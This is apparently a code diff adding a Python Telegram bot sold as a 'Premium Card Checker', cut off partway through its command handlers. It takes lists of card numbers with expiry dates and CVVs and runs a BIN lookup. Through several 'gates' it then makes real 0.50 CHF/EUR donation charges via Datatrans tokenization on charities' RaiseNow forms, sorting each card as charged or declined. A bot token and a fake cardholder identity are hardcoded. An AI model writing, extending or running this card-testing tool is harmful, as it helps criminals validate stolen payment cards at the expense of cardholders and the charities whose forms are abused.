@@ -1,0 +1,1752 @@
+import telegram
+from telegram.ext import Application, CommandHandler, MessageHandler, filters, Defaults, CallbackQueryHandler
+import requests
+import json
+import logging
+import asyncio
+import io
+import re
+import time
+import os
+import shutil
+import threading
+from datetime import datetime
+from pytz import timezone
+from telegram import InlineKeyboardButton, InlineKeyboardMarkup, User
+from telegram.constants import ParseMode
+from telegram.helpers import escape_markdown
+from concurrent.futures import ThreadPoolExecutor, as_completed
+
+# --- CẤU HÌNH ---
+BOT_TOKEN = "8383293948:AAEDVbBV05dXWHNZXod3RRJjmwqc2N4xsjQ"
+ADMIN_ID = 5127429005
+ADMIN_USERNAME = "@startsuttdow"
+
+# --- TÊN FILE & THƯ MỤC LƯU TRỮ ---
+USER_FILE = "authorized_users.txt"
+LIMIT_FILE = "user_limits.json" # Giới hạn cho /mass
+MULTI_LIMIT_FILE = "multi_limits.json" # Giới hạn cho /multi
+STATS_FILE = "user_stats.json"
+PREFS_FILE = "user_prefs.json" # File lưu ngôn ngữ
+LOG_DIR = "check_logs" # Thư mục chính lưu log
+BOT_STATUS_FILE = "bot_status.json" # File lưu trạng thái on/off của bot
+GATE_FILE = "current_gate.json" # File lưu cổng check hiện tại
+
+# --- GIỚI HẠN MẶC ĐỊNH CHO THÀNH VIÊN ---
+DEFAULT_MEMBER_LIMIT = 100 # Cho /mass
+MEMBER_THREAD_LIMIT = 3 # Cho /mass
+DEFAULT_MULTI_LIMIT = 10 # Cho /multi
+
+# --- CẤU HÌNH MÚI GIỜ ---
+VIETNAM_TZ = timezone('Asia/Ho_Chi_Minh')
+
+# --- BIẾN TOÀN CỤC ---
+ACTIVE_CHECKS = set()
+CANCELLATION_EVENTS = {} # {user_id: threading.Event}
+BRAND_TO_PAYMENT_METHOD = { # Ánh xạ brand thẻ sang code API
+    'VISA': 'VIS',
+    'MASTERCARD': 'ECA',
+    'AMERICAN EXPRESS': 'AMX',
+}
+
+# --- TIN NHẮN THÔNG BÁO ---
+MESSAGES_VI = {
+    "bot_off": "🔴 **THÔNG BÁO BẢO TRÌ** 🔴\n\nBot hiện đang tạm thời ngoại tuyến để bảo trì. Các lệnh check sẽ không hoạt động cho đến khi có thông báo mới. Cảm ơn sự kiên nhẫn của bạn!",
+    "bot_on": "🟢 **THÔNG BÁO HOẠT ĐỘNG** 🟢\n\nBot đã hoạt động trở lại. Cảm ơn bạn đã chờ đợi!",
+}
+MESSAGES_EN = {
+    "bot_off": "🔴 **MAINTENANCE NOTICE** 🔴\n\nThe bot is temporarily offline for maintenance. Checking commands will be disabled until further notice. Thank you for your patience!",
+    "bot_on": "🟢 **SERVICE RESUMED NOTICE** 🟢\n\nThe bot is back online. Thank you for waiting!",
+}
+
+# --- CẤU HÌNH LOGGING ---
+logging.basicConfig(
+    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
+    level=logging.INFO
+)
+logger = logging.getLogger(__name__)
+
+# --- KHỞI TẠO ---
+# Tạo thư mục log nếu chưa có
+os.makedirs(LOG_DIR, exist_ok=True)
+
+# --- QUẢN LÝ USER, DATA & GATE ---
+def load_json_file(filename, default_data={}):
+    if not os.path.exists(filename):
+        return default_data
+    try:
+        with open(filename, "r", encoding='utf-8') as f:
+            return json.load(f)
+    except (json.JSONDecodeError, FileNotFoundError):
+        return default_data
+
+def save_json_file(filename, data):
+    with open(filename, "w", encoding='utf-8') as f:
+        json.dump(data, f, indent=4)
+
+def load_users():
+    try:
+        with open(USER_FILE, "r") as f:
+            return {int(line.strip()) for line in f if line.strip().isdigit()}
+    except FileNotFoundError:
+        return set()
+
+def save_users(user_set):
+    with open(USER_FILE, "w") as f:
+        for user_id in user_set:
+            f.write(str(user_id) + "\n")
+
+def get_user_limit(user_id):
+    limits = load_json_file(LIMIT_FILE)
+    return limits.get(str(user_id), DEFAULT_MEMBER_LIMIT)
+
+def get_user_multi_limit(user_id):
+    limits = load_json_file(MULTI_LIMIT_FILE)
+    return limits.get(str(user_id), DEFAULT_MULTI_LIMIT)
+
+def get_user_lang(user_id):
+    prefs = load_json_file(PREFS_FILE)
+    return prefs.get(str(user_id), None)
+
+def set_user_lang(user_id, lang_code):
+    prefs = load_json_file(PREFS_FILE)
+    prefs[str(user_id)] = lang_code
+    save_json_file(PREFS_FILE, prefs)
+
+def is_bot_on():
+    status = load_json_file(BOT_STATUS_FILE, default_data={'is_on': True})
+    return status.get('is_on', True)
+
+def set_bot_status(is_on: bool):
+    save_json_file(BOT_STATUS_FILE, {'is_on': is_on})
+
+def get_active_gate():
+    gate_data = load_json_file(GATE_FILE, default_data={'gate': '1'})
+    return gate_data.get('gate', '1')
+
+def set_active_gate(gate_id):
+    save_json_file(GATE_FILE, {'gate': str(gate_id)})
+
+def update_user_stats(user_id, user_info, counts):
+    stats = load_json_file(STATS_FILE)
+    user_id_str = str(user_id)
+    
+    default_user_stat = {
+        'username': None, 'full_name': None, 'total_charged': 0, 'total_custom': 0,
+        'total_decline': 0, 'total_error': 0, 'total_invalid': 0, 'last_check_timestamp': ''
+    }
+    user_stat_data = stats.get(user_id_str, {})
+    if isinstance(user_stat_data, dict):
+        default_user_stat.update(user_stat_data)
+    
+    stats[user_id_str] = default_user_stat
+    
+    stats[user_id_str]['total_charged'] += counts.get('success', 0)
+    stats[user_id_str]['total_custom'] += counts.get('custom', 0)
+    stats[user_id_str]['total_decline'] += counts.get('decline', 0)
+    stats[user_id_str]['total_error'] += counts.get('error', 0)
+    stats[user_id_str]['total_invalid'] += counts.get('invalid_format', 0)
+    stats[user_id_str]['last_check_timestamp'] = datetime.now(VIETNAM_TZ).strftime("%Y-%m-%d %H:%M:%S")
+    stats[user_id_str]['username'] = user_info.username
+    stats[user_id_str]['full_name'] = user_info.full_name
+    
+    save_json_file(STATS_FILE, stats)
+
+# --- CÁC HÀM CỐT LÕI ---
+
+def make_request_with_retry(session, method, url, max_retries=5, cancellation_event=None, **kwargs):
+    last_exception = None
+    for attempt in range(max_retries):
+        if cancellation_event and cancellation_event.is_set():
+            return None, "Operation cancelled by user"
+            
+        try:
+            response = session.request(method, url, **kwargs)
+            return response, None
+        except requests.exceptions.RequestException as e:
+            last_exception = e
+            wait_time = attempt + 1
+            logger.warning(f"Lần thử {attempt + 1}/{max_retries} cho {url} thất bại: {e}. Thử lại sau {wait_time}s...")
+            time.sleep(wait_time)
+    
+    final_error_message = f"Retry: Tất cả {max_retries} lần thử lại cho {url} đều thất bại. Lỗi cuối cùng: {last_exception}"
+    logger.error(final_error_message)
+    return None, final_error_message
+
+def validate_card_format(cc, mes, ano, cvv):
+    if not (cc.isdigit() and 10 <= len(cc) <= 19):
+        return False, "Số thẻ (CC) phải có từ 10-19 chữ số."
+    if not (mes.isdigit() and 1 <= len(mes) <= 2 and 1 <= int(mes) <= 12):
+        return False, "Tháng (MM) phải là số từ 1 đến 12."
+    if not (ano.isdigit() and len(ano) in [2, 4]):
+        return False, "Năm (YY) phải có 2 hoặc 4 chữ số."
+    if not (cvv.isdigit() and 3 <= len(cvv) <= 4):
+        return False, "CVV phải có 3 hoặc 4 chữ số."
+    return True, ""
+
+def _check_card_gate1(session, line, cc, mes, ano, cvv, bin_info, ua, cancellation_event):
+    """Logic cho Gate 1: Charge 0.5$"""
+    try:
+        tokenize_url = "https://pay.datatrans.com/upp/payment/SecureFields/paymentField"
+        tokenize_payload = { "mode": "TOKENIZE", "formId": "250731042226459797", "cardNumber": cc, "cvv": cvv, "paymentMethod": "ECA", "merchantId": "3000022877", "browserUserAgent": ua, "browserJavaEnabled": "false", "browserLanguage": "en-US", "browserColorDepth": "24", "browserScreenHeight": "1152", "browserScreenWidth": "2048", "browserTZ": "-420" }
+        tokenize_headers = { "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Origin": "https://pay.datatrans.com", "Referer": "https://pay.datatrans.com/upp/payment/SecureFields/paymentField?mode=TOKENIZE&merchantId=3000022877&fieldName=cardNumber&formId=&placeholder=0000%200000%200000%200000&ariaLabel=Card%20number&inputType=tel&version=2.0.0&fieldNames=cardNumber,cvv&instanceId=8di84dqo8", "X-Requested-With": "XMLHttpRequest" }
+        
+        token_response, error = make_request_with_retry(session, 'post', tokenize_url, data=tokenize_payload, headers=tokenize_headers, timeout=15, cancellation_event=cancellation_event)
+        if error: return 'cancelled' if "cancelled" in error else 'error', line, f"Lỗi Tokenize: {error}", bin_info
+        if not token_response: return 'error', line, "Lỗi HTTP không có phản hồi khi Tokenize", bin_info
+        
+        try:
+            token_data = token_response.json()
+            if "error" in token_data and token_data.get("error") == "Invalid cardNumber":
+                return 'decline', line, 'INVALID_CARDNUMBER_DECLINE', bin_info
+            transaction_id = token_data.get("transactionId")
+            if not transaction_id:
+                return 'decline', line, token_data.get("error", {}).get("message", "Unknown error"), bin_info
+        except json.JSONDecodeError:
+            if token_response.status_code != 200:
+                return 'error', line, f"Lỗi HTTP {token_response.status_code} khi Tokenize", bin_info
+            return 'error', line, "Phản hồi Tokenize không phải JSON", bin_info
+        
+        payment_url = "https://api.raisenow.io/payments"
+        payment_payload = { "account_uuid": "28b36aa5-879a-438a-886f-434d78d1184d", "test_mode": False, "create_supporter": False, "amount": {"currency": "CHF", "value": 50}, "supporter": {"locale": "en", "first_name": "Minh", "last_name": "Nhat", "email": "minhnhat.144417@gmail.com", "email_permission": False, "raisenow_parameters": {"integration": {"opt_in": {"email": False}}}}, "raisenow_parameters": {"analytics": {"channel": "embed", "preselected_amount": "10000", "suggested_amounts": "[10000,15000,20000]", "user_agent": ua}, "solution": {"uuid": "f2166434-2e5c-4575-b32a-b4171f9a8b8c", "name": "Books for Change Spendenformular", "type": "donate"}, "product": {"name": "tamaro", "source_url": "https://donate.raisenow.io/hmyks?analytics.channel=embed&lng=en", "uuid": "self-service", "version": "2.15.3"}, "integration": {"donation_receipt_requested": "false"}}, "custom_parameters": {"campaign_id": "", "campaign_subid": ""}, "payment_information": {"brand_code": "eca", "cardholder": "Minh Nhat", "expiry_month": mes, "expiry_year": ano, "transaction_id": transaction_id}, "profile": "a8c1fc04-0647-4781-888b-8783d35ca2f5", "return_url": "https://donate.raisenow.io/hmyks?analytics.channel=embed&lng=en&rnw-view=payment_result" }
+        payment_headers = { "Content-Type": "application/json", "Origin": "https://donate.raisenow.io", "Referer": "https://donate.raisenow.io/" }
+        
+        payment_response, error = make_request_with_retry(session, 'post', payment_url, json=payment_payload, headers=payment_headers, timeout=20, cancellation_event=cancellation_event)
+        if error: return 'cancelled' if "cancelled" in error else 'error', line, f"Lỗi Payment: {error}", bin_info
+
+        response_text = payment_response.text
+
+        if '"payment_status":"succeeded"' in response_text: return 'success', line, response_text, bin_info
+        elif '"payment_status":"failed"' in response_text: return 'decline', line, response_text, bin_info
+        elif '"action":{"action_type":"redirect","url":"https:\\/\\/hooks.stripe.com\\/3d_secure_2\\/hosted?merchant=' in response_text: return 'custom', line, response_text, bin_info
+        elif '"3d_secure_2"' in response_text: return 'custom', line, response_text, bin_info
+        else: return 'unknown', line, response_text, bin_info
+    except Exception as e:
+        logger.error(f"Lỗi không xác định trong Gate 1 cho line '{line}': {e}", exc_info=True)
+        return 'error', line, f"Lỗi hệ thống Gate 1: {e}", bin_info
+
+def _check_card_gate2(session, line, cc, mes, ano, cvv, bin_info, ua, cancellation_event):
+    """Logic cho Gate 2: Charge 0.5$ V2"""
+    try:
+        brand_upper = (bin_info.get('brand') or '').upper()
+        payment_method = BRAND_TO_PAYMENT_METHOD.get(brand_upper, 'VIS')
+        brand_code = payment_method.lower()
+
+        tokenize_url = "https://pay.datatrans.com/upp/payment/SecureFields/paymentField"
+        tokenize_payload = { "mode": "TOKENIZE", "formId": "250801203254539560", "cardNumber": cc, "cvv": cvv, "paymentMethod": payment_method, "merchantId": "3000022877", "browserUserAgent": ua, "browserJavaEnabled": "false", "browserLanguage": "vi-VN", "browserColorDepth": "24", "browserScreenHeight": "1152", "browserScreenWidth": "2048", "browserTZ": "-420" }
+        tokenize_headers = { "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Origin": "https://pay.datatrans.com", "Referer": "https://pay.datatrans.com/upp/payment/SecureFields/paymentField?mode=TOKENIZE&merchantId=3000022877&fieldName=cardNumber&formId=&placeholder=0000%200000%200000%200000&ariaLabel=Card%20number&inputType=tel&version=2.0.0&fieldNames=cardNumber,cvv&instanceId=0cjn3q43b", "X-Requested-With": "XMLHttpRequest" }
+
+        token_response, error = make_request_with_retry(session, 'post', tokenize_url, data=tokenize_payload, headers=tokenize_headers, timeout=15, cancellation_event=cancellation_event)
+        if error: return 'cancelled' if "cancelled" in error else 'error', line, f"Lỗi Tokenize: {error}", bin_info
+        if not token_response: return 'error', line, "Lỗi HTTP không có phản hồi khi Tokenize", bin_info
+
+        try:
+            token_data = token_response.json()
+            if "error" in token_data and token_data.get("error") == "Invalid cardNumber":
+                return 'decline', line, 'INVALID_CARDNUMBER_DECLINE', bin_info
+            transaction_id = token_data.get("transactionId")
+            if not transaction_id:
+                return 'decline', line, token_data.get("error", {}).get("message", "Unknown error"), bin_info
+        except json.JSONDecodeError:
+            if token_response.status_code != 200:
+                return 'error', line, f"Lỗi HTTP {token_response.status_code} khi Tokenize", bin_info
+            return 'error', line, "Phản hồi Tokenize không phải JSON", bin_info
+
+        payment_url = "https://api.raisenow.io/payments"
+        payment_payload = { "account_uuid": "079beaee-ca86-4b8c-9d08-e71b4bd0a40e", "test_mode": False, "create_supporter": False, "amount": {"currency": "CHF", "value": 50}, "supporter": {"locale": "de", "first_name": "Minh", "last_name": "Nhut", "email": "minhnhat.144417@gmail.com", "email_permission": False, "raisenow_parameters": {"integration": {"opt_in": {"email": False}}}, "street": "Oakridge Farm Lane", "house_number": "2830", "postal_code": "424242", "city": "cc"}, "raisenow_parameters": {"analytics": {"channel": "embed", "preselected_amount": "5000", "suggested_amounts": "[5000,10000,15000]", "user_agent": ua}, "solution": {"uuid": "3f9c8a06-2d0b-4497-b627-e3ba34069ad2", "name": "Online-Spende", "type": "donate"}, "product": {"name": "tamaro", "source_url": "https://donate.raisenow.io/xdcxy?analytics.channel=embed&lng=de", "uuid": "self-service", "version": "2.16.0"}, "integration": {"donation_receipt_requested": "false"}}, "custom_parameters": {"campaign_id": "", "campaign_subid": ""}, "payment_information": {"brand_code": brand_code, "cardholder": "Minh Nhut", "expiry_month": mes, "expiry_year": ano, "transaction_id": transaction_id}, "profile": "1d7dd23e-7007-4d3b-85b7-00891d2c6df5", "return_url": "https://donate.raisenow.io/xdcxy?analytics.channel=embed&lng=de&rnw-view=payment_result" }
+        payment_headers = { "Content-Type": "application/json", "Origin": "https://donate.raisenow.io", "Referer": "https://donate.raisenow.io/" }
+
+        payment_response, error = make_request_with_retry(session, 'post', payment_url, json=payment_payload, headers=payment_headers, timeout=20, cancellation_event=cancellation_event)
+        if error: return 'cancelled' if "cancelled" in error else 'error', line, f"Lỗi Payment: {error}", bin_info
+
+        response_text = payment_response.text
+
+        if '"payment_status":"succeeded"' in response_text: return 'success', line, response_text, bin_info
+        elif '"payment_status":"failed"' in response_text: return 'decline', line, response_text, bin_info
+        elif '"action":{"action_type":"redirect"' in response_text: return 'custom', line, response_text, bin_info
+        elif '"3d_secure_2"' in response_text: return 'custom', line, response_text, bin_info
+        else: return 'unknown', line, response_text, bin_info
+    except Exception as e:
+        logger.error(f"Lỗi không xác định trong Gate 2 cho line '{line}': {e}", exc_info=True)
+        return 'error', line, f"Lỗi hệ thống Gate 2: {e}", bin_info
+
+def _check_card_gate3(session, line, cc, mes, ano, cvv, bin_info, ua, cancellation_event):
+    """Logic cho Gate 3: Charge 0.5$ V3"""
+    try:
+        # Step 1: Tokenize card
+        tokenize_url = "https://pay.datatrans.com/upp/payment/SecureFields/paymentField"
+        tokenize_payload = {
+            "mode": "TOKENIZE",
+            "formId": "250802045852818974",
+            "cardNumber": cc,
+            "cvv": cvv,
+            "paymentMethod": "VIS", # Hardcoded as per request
+            "merchantId": "3000022877",
+            "browserUserAgent": ua,
+            "browserJavaEnabled": "false",
+            "browserLanguage": "vi-VN",
+            "browserColorDepth": "24",
+            "browserScreenHeight": "1152",
+            "browserScreenWidth": "2048",
+            "browserTZ": "-420"
+        }
+        tokenize_headers = {
+            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+            "Origin": "https://pay.datatrans.com",
+            "Referer": "https://pay.datatrans.com/upp/payment/SecureFields/paymentField?mode=TOKENIZE&merchantId=3000022877&fieldName=cardNumber&formId=&placeholder=0000%200000%200000%200000&ariaLabel=Card%20number&inputType=tel&version=2.0.0&fieldNames=cardNumber,cvv&instanceId=x0gzkbt03",
+            "X-Requested-With": "XMLHttpRequest"
+        }
+
+        token_response, error = make_request_with_retry(session, 'post', tokenize_url, data=tokenize_payload, headers=tokenize_headers, timeout=15, cancellation_event=cancellation_event)
+        if error: return 'cancelled' if "cancelled" in error else 'error', line, f"Lỗi Tokenize: {error}", bin_info
+        if not token_response: return 'error', line, "Lỗi HTTP không có phản hồi khi Tokenize", bin_info
+
+        try:
+            token_data = token_response.json()
+            if "error" in token_data and token_data.get("error") == "Invalid cardNumber":
+                return 'decline', line, 'INVALID_CARDNUMBER_DECLINE', bin_info
+            transaction_id = token_data.get("transactionId")
+            if not transaction_id:
+                return 'decline', line, token_data.get("error", {}).get("message", "Unknown error"), bin_info
+        except json.JSONDecodeError:
+            if token_response.status_code != 200:
+                return 'error', line, f"Lỗi HTTP {token_response.status_code} khi Tokenize", bin_info
+            return 'error', line, "Phản hồi Tokenize không phải JSON", bin_info
+
+        # Step 2: Make payment request
+        payment_url = "https://api.raisenow.io/payments"
+        payment_payload = {
+            "account_uuid": "bda022a8-9955-419d-b949-037e64ef6294",
+            "test_mode": False,
+            "create_supporter": False,
+            "amount": {"currency": "EUR", "value": 50},
+            "supporter": {
+                "locale": "de",
+                "first_name": "Minh",
+                "last_name": "Nhat",
+                "email": "minhnhat.144417@gmail.com",
+                "email_permission": False,
+                "raisenow_parameters": {"integration": {"opt_in": {"email": False}}}
+            },
+            "raisenow_parameters": {
+                "analytics": {
+                    "channel": "embed",
+                    "preselected_amount": "2500",
+                    "suggested_amounts": "[2500,5000,10000]",
+                    "user_agent": ua
+                },
+                "solution": {"uuid": "9b693323-de98-41da-85f6-74c8aa32d2dd", "name": "Allgemein", "type": "donate"},
+                "product": {
+                    "name": "tamaro",
+                    "source_url": "https://donate.raisenow.io/jpctq?analytics.channel=embed&lng=de",
+                    "uuid": "self-service",
+                    "version": "2.16.0"
+                },
+                "integration": {"donation_receipt_requested": "false"}
+            },
+            "custom_parameters": {"campaign_id": "", "campaign_subid": ""},
+            "payment_information": {
+                "brand_code": "vis",
+                "cardholder": "Minh Nhat",
+                "expiry_month": mes,
+                "expiry_year": ano,
+                "transaction_id": transaction_id
+            },
+            "profile": "b2fbfb20-3195-4730-b569-4db7134e2dff",
+            "return_url": "https://donate.raisenow.io/jpctq?analytics.channel=embed&lng=de&rnw-view=payment_result"
+        }
+        payment_headers = {
+            "Content-Type": "application/json",
+            "Origin": "https://donate.raisenow.io",
+            "Referer": "https://donate.raisenow.io/"
+        }
+
+        payment_response, error = make_request_with_retry(session, 'post', payment_url, json=payment_payload, headers=payment_headers, timeout=20, cancellation_event=cancellation_event)
+        if error: return 'cancelled' if "cancelled" in error else 'error', line, f"Lỗi Payment: {error}", bin_info
+
+        response_text = payment_response.text
+
+        if '"payment_status":"succeeded"' in response_text: return 'success', line, response_text, bin_info
+        elif '"payment_status":"failed"' in response_text: return 'decline', line, response_text, bin_info
+        elif '"action":{"action_type":"redirect"' in response_text: return 'custom', line, response_text, bin_info
+        elif '"3d_secure_2"' in response_text: return 'custom', line, response_text, bin_info
+        else: return 'unknown', line, response_text, bin_info
+    except Exception as e:
+        logger.error(f"Lỗi không xác định trong Gate 3 cho line '{line}': {e}", exc_info=True)
+        return 'error', line, f"Lỗi hệ thống Gate 3: {e}", bin_info
+
+def _check_card_gate4(session, line, cc, mes, ano, cvv, bin_info, ua, cancellation_event):
+    """Logic cho Gate 4: Charge 0.5$ V4 (dựa trên hình ảnh)"""
+    try:
+        brand_upper = (bin_info.get('brand') or '').upper()
+        payment_method = BRAND_TO_PAYMENT_METHOD.get(brand_upper, 'ECA') # Mặc định là ECA như trong ảnh
+        brand_code = payment_method.lower()
+
+        # Step 1: Tokenize card
+        tokenize_url = "https://pay.datatrans.com/upp/payment/SecureFields/paymentField"
+        tokenize_payload = {
+            "mode": "TOKENIZE",
+            "formId": "250802080040638504",
+            "cardNumber": cc,
+            "cvv": cvv,
+            "paymentMethod": payment_method,
+            "merchantId": "3000022877",
+            "browserUserAgent": ua,
+            "browserJavaEnabled": "false",
+            "browserLanguage": "vi-VN",
+            "browserColorDepth": "24",
+            "browserScreenHeight": "1152",
+            "browserScreenWidth": "2048",
+            "browserTZ": "-420"
+        }
+        tokenize_headers = {
+            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+            "Origin": "https://pay.datatrans.com",
+            "Referer": "https://pay.datatrans.com/upp/payment/SecureFields/paymentField?mode=TOKENIZE&merchantId=3000022877&fieldName=cardNumber&formId=&placeholder=0000%200000%200000%200000&ariaLabel=Card%20number&inputType=tel&version=2.0.0&fieldNames=cardNumber,cvv&instanceId=32stkhqhm",
+            "X-Requested-With": "XMLHttpRequest"
+        }
+
+        token_response, error = make_request_with_retry(session, 'post', tokenize_url, data=tokenize_payload, headers=tokenize_headers, timeout=15, cancellation_event=cancellation_event)
+        if error: return 'cancelled' if "cancelled" in error else 'error', line, f"Lỗi Tokenize: {error}", bin_info
+        if not token_response: return 'error', line, "Lỗi HTTP không có phản hồi khi Tokenize", bin_info
+
+        try:
+            token_data = token_response.json()
+            if "error" in token_data and token_data.get("error") == "Invalid cardNumber":
+                return 'decline', line, 'INVALID_CARDNUMBER_DECLINE', bin_info
+            transaction_id = token_data.get("transactionId")
+            if not transaction_id:
+                return 'decline', line, token_data.get("error", {}).get("message", "Unknown error"), bin_info
+        except json.JSONDecodeError:
+            if token_response.status_code != 200:
+                return 'error', line, f"Lỗi HTTP {token_response.status_code} khi Tokenize", bin_info
+            return 'error', line, "Phản hồi Tokenize không phải JSON", bin_info
+
+        # Step 2: Make payment request
+        payment_url = "https://api.raisenow.io/payments"
+        payment_payload = {
+            "account_uuid": "0e83cbe3-4186-4bfb-a8e2-4c319e8902c2",
+            "test_mode": False,
+            "create_supporter": False,
+            "amount": {"currency": "EUR", "value": 50},
+            "supporter": {
+                "locale": "en",
+                "first_name": "Minh",
+                "last_name": "Nhat",
+                "email": "minhnhat.144417@gmail.com",
+                "email_permission": False,
+                "raisenow_parameters": {"integration": {"opt_in": {"email": False}}},
+                "street": "Oakridge Farm Lane",
+                "house_number": "2830",
+                "postal_code": "424242",
+                "city": "West Allis",
+                "country": "VN"
+            },
+            "raisenow_parameters": {
+                "analytics": {
+                    "channel": "embed",
+                    "preselected_amount": "2500",
+                    "suggested_amounts": "[2500,5000,0.15000]",
+                    "user_agent": ua
+                },
+                "solution": {"uuid": "7562d73f-6a18-4605-a534-47196396ad54", "name": "EDRI Form", "type": "donate"},
+                "product": {
+                    "name": "tamaro",
+                    "source_url": "https://donate.raisenow.io/psrkq?analytics.channel=embed&lng=en",
+                    "uuid": "self-service",
+                    "version": "2.16.0"
+                }
+            },
+            "custom_parameters": {"campaign_id": "", "campaign_subid": ""},
+            "payment_information": {
+                "brand_code": brand_code,
+                "cardholder": "Minh Nhat",
+                "expiry_month": mes,
+                "expiry_year": ano,
+                "transaction_id": transaction_id
+            },
+            "profile": "56d3c80c-6e0a-4702-bdce-5f6e09b071d0",
+            "return_url": "https://donate.raisenow.io/psrkq?analytics.channel=embed&lng=en&rnw-view=payment_result"
+        }
+        payment_headers = {
+            "Content-Type": "application/json",
+            "Origin": "https://donate.raisenow.io",
+            "Referer": "https://donate.raisenow.io/"
+        }
+
+        payment_response, error = make_request_with_retry(session, 'post', payment_url, json=payment_payload, headers=payment_headers, timeout=20, cancellation_event=cancellation_event)
+        if error: return 'cancelled' if "cancelled" in error else 'error', line, f"Lỗi Payment: {error}", bin_info
+
+        response_text = payment_response.text
+
+        if '"payment_status":"succeeded"' in response_text: return 'success', line, response_text, bin_info
+        elif '"payment_status":"failed"' in response_text: return 'decline', line, response_text, bin_info
+        elif '"action":{"action_type":"redirect"' in response_text: return 'custom', line, response_text, bin_info
+        elif '"3d_secure_2"' in response_text: return 'custom', line, response_text, bin_info
+        else: return 'unknown', line, response_text, bin_info
+    except Exception as e:
+        logger.error(f"Lỗi không xác định trong Gate 4 cho line '{line}': {e}", exc_info=True)
+        return 'error', line, f"Lỗi hệ thống Gate 4: {e}", bin_info
+
+def check_card(line, cancellation_event=None):
+    if cancellation_event and cancellation_event.is_set():
+        return 'cancelled', line, 'User cancelled', {}
+
+    parts = line.strip().split('|')
+    cc, mes, ano, cvv = "", "", "", ""
+
+    if len(parts) == 4:
+        cc, mes, ano, cvv = [p.strip() for p in parts]
+    elif len(parts) == 3:
+        cc_part, date_part, cvv_part = [p.strip() for p in parts]
+        if '/' in date_part:
+            date_split = date_part.split('/')
+            if len(date_split) == 2:
+                cc, mes, ano, cvv = cc_part.strip(), date_split[0].strip(), date_split[1].strip(), cvv_part.strip()
+            else:
+                return 'invalid_format', line, "Định dạng ngày tháng không hợp lệ (mm/yy hoặc mm/yyyy).", {}
+        else:
+            return 'invalid_format', line, "Thiếu dấu '/' trong phần ngày tháng.", {}
+    else:
+        return 'invalid_format', line, "Định dạng không hợp lệ (cc|mm|yy|cvv hoặc cc|mm/yy|cvv).", {}
+
+    is_valid, error_message = validate_card_format(cc, mes, ano, cvv)
+    if not is_valid:
+        return 'invalid_format', line, error_message, {}
+
+    try:
+        year_str = ano.strip()
+        if len(year_str) == 2:
+            full_year = int(f"20{year_str}")
+        elif len(year_str) == 4:
+            full_year = int(year_str)
+        else:
+            full_year = 0 
+        if full_year < datetime.now().year:
+            return 'decline', line, 'EXPIRED_CARD_DECLINE', {}
+    except ValueError:
+        return 'invalid_format', line, "Năm hết hạn không hợp lệ.", {}
+
+    if len(ano) == 2: ano = f"20{ano}"
+    
+    session = requests.Session()
+    ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+    session.headers.update({"User-Agent": ua})
+    
+    bin_info = {}
+
+    try:
+        bin_to_check = cc[:6]
+        bin_url = "https://bins.antipublic.cc/bins/" + bin_to_check
+        bin_headers = {"user-agent": ua, "Pragma": "no-cache", "Accept": "*/*"}
+        bin_response, error = make_request_with_retry(session, 'get', bin_url, headers=bin_headers, timeout=10, cancellation_event=cancellation_event)
+        
+        if error:
+            return 'cancelled' if "cancelled" in error else 'error', line, f"Lỗi kiểm tra BIN: {error}", {}
+        
+        if bin_response:
+            response_text_lower = bin_response.text.lower()
+            if "not found" in response_text_lower and ('"detail":' in response_text_lower or bin_response.status_code != 200):
+                return 'decline', line, 'INVALID_BIN_DECLINE', {}
+            
+            if bin_response.status_code == 200:
+                try:
+                    data = bin_response.json()
+                    if isinstance(data, dict):
+                        bin_info.update(data)
+                    else:
+                        logger.warning(f"API BIN trả về dữ liệu không phải dictionary cho BIN {bin_to_check}: {data}")
+                except json.JSONDecodeError:
+                    logger.warning(f"Lỗi phân tích JSON từ BIN check cho BIN {bin_to_check}")
+
+        country_name_str = bin_info.get('country_name') or ''
+        if country_name_str.upper() == 'VIETNAM':
+            return 'decline', line, 'VIETNAM_BIN_DECLINE', bin_info
+        
+        active_gate = get_active_gate()
+        
+        if active_gate == '2':
+            return _check_card_gate2(session, line, cc, mes, ano, cvv, bin_info, ua, cancellation_event)
+        elif active_gate == '3':
+            return _check_card_gate3(session, line, cc, mes, ano, cvv, bin_info, ua, cancellation_event)
+        elif active_gate == '4':
+            return _check_card_gate4(session, line, cc, mes, ano, cvv, bin_info, ua, cancellation_event)
+        else: # Default to gate 1
+            return _check_card_gate1(session, line, cc, mes, ano, cvv, bin_info, ua, cancellation_event)
+
+    except Exception as e:
+        logger.error(f"Lỗi không xác định trong check_card cho line '{line}': {e}", exc_info=True)
+        return 'error', line, f"Lỗi hệ thống không xác định: {e}", bin_info
+
+def create_progress_bar(current, total, length=10):
+    if total == 0: return "[░░░░░░░░░░] 0%"
+    fraction = current / total
+    filled_len = int(length * fraction)
+    bar = '█' * filled_len + '░' * (length - filled_len)
+    return f"[{bar}] {int(fraction * 100)}%"
+
+def get_flag_emoji(country_code):
+    if not country_code or len(country_code) != 2: return ''
+    try:
+        return ''.join(chr(0x1F1E6 + ord(char.upper()) - ord('A')) for char in country_code)
+    except Exception:
+        return ''
+
+# --- LỆNH BOT ---
+async def start(update, context):
+    user = update.effective_user
+    lang = get_user_lang(user.id) or 'en' 
+
+    if user.id in load_users() or user.id == ADMIN_ID:
+        if lang == 'vi':
+            await update.message.reply_text(f"**Chào mừng trở lại, {user.first_name}!**\nDùng /help để xem các lệnh bạn có thể sử dụng.")
+        else:
+            await update.message.reply_text(f"**Welcome back, {user.first_name}!**\nUse /help to see the available commands.")
+    else:
+        welcome_message = (
+            "**Welcome to the Premium Card Checker Bot!** 🤖\n\n"
+            "This bot utilizes a powerful `Charge 0.5$ Api Auth` to provide accurate card checking services.\n\n"
+            "**Your current status:** `GUEST`\n"
+            f"Your Telegram ID: `{user.id}`\n\n"
+            "**🌟 Upgrade to Premium! 🌟**\n"
+            "Unlock the full potential of the bot with a Premium membership:\n"
+            "✅ **Unlimited Checking:** No restrictions on the number of cards you can check.\n"
+            "✅ **Priority Support:** Get faster assistance from the admin.\n\n"
+            f"To get access and upgrade to Premium, please contact the admin with your ID: {ADMIN_USERNAME}"
+        )
+        await update.message.reply_text(welcome_message)
+
+async def info(update, context):
